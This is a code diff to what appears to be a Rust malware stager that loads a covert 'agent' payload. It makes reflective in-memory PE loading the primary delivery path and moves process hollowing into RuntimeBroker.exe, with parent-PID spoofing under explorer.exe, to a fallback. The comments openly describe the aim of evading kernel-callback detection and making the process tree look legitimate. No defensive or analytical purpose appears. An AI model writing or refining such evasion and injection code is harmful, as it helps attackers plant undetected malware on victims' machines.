@@ -342,41 +342,33 @@ pub fn do_staged_load() -> ! {
         }
     };
 
-    // Step 6: when process-hollow and ppid-spoof features are both active,
-    // hollow the full agent into RuntimeBroker.exe (spoofed under explorer.exe)
-    // so all future child processes appear to come from a legitimate parent.
-    // The stager then exits cleanly; the agent runs inside the hollowed process.
-    #[cfg(all(feature = "process-hollow", feature = "ppid-spoof"))]
-    {
-        let explorer_pid = crate::inject::pid_by_name("explorer.exe");
-        let target = "C:\\Windows\\System32\\RuntimeBroker.exe";
-        let spoofed = explorer_pid.and_then(|ppid| {
-            crate::inject::spawn_suspended_spoofed(target, ppid)
-        });
-        let hollow_ok = if let Some((proc, thread)) = spoofed {
-            let ok = crate::inject::hollow_into_process(proc, thread, &pe_bytes).is_ok();
-            if !ok {
-                // If hollow failed the process is abandoned — it was suspended and
-                // will be cleaned up by the OS when our stager exits.
-            }
-            ok
-        } else {
-            false
-        };
-        if hollow_ok {
-            std::process::exit(0);
-        }
-        // Fallback: hollow without PPID spoof if the spoofed spawn failed.
-        if crate::inject::inject_hollow(target, &pe_bytes).is_ok() {
-            std::process::exit(0);
-        }
-    }
-
-    // Non-hollow path: reflect the agent PE into the stager's own address space.
+    // Primary path: reflect the agent PE into the stager's own address space.
+    // No cross-process operations — the kernel callback sequence is just self-allocation
+    // + self-write, which is indistinguishable from ordinary dynamic code loading.
+    // The stager process itself was spawned with PPID spoofing by the dropper, so the
+    // process tree already looks legitimate even without hollowing into a new process.
     let entry = unsafe {
         match reflect_pe(&pe_bytes) {
             Ok(ep) => ep,
-            Err(_) => std::process::exit(0),
+            Err(_) => {
+                // reflect_pe can only fail if VirtualAlloc returns null (extreme memory
+                // pressure).  Fall back to hollow so delivery still succeeds.
+                #[cfg(all(feature = "process-hollow", feature = "ppid-spoof"))]
+                {
+                    let explorer_pid = crate::inject::pid_by_name("explorer.exe");
+                    let target = "C:\\Windows\\System32\\RuntimeBroker.exe";
+                    let spoofed = explorer_pid.and_then(|ppid| {
+                        crate::inject::spawn_suspended_spoofed(target, ppid)
+                    });
+                    if let Some((proc, thread)) = spoofed {
+                        if crate::inject::hollow_into_process(proc, thread, &pe_bytes).is_ok() {
+                            std::process::exit(0);
+                        }
+                    }
+                    let _ = crate::inject::inject_hollow(target, &pe_bytes);
+                }
+                std::process::exit(0);
+            }
         }
     };
 
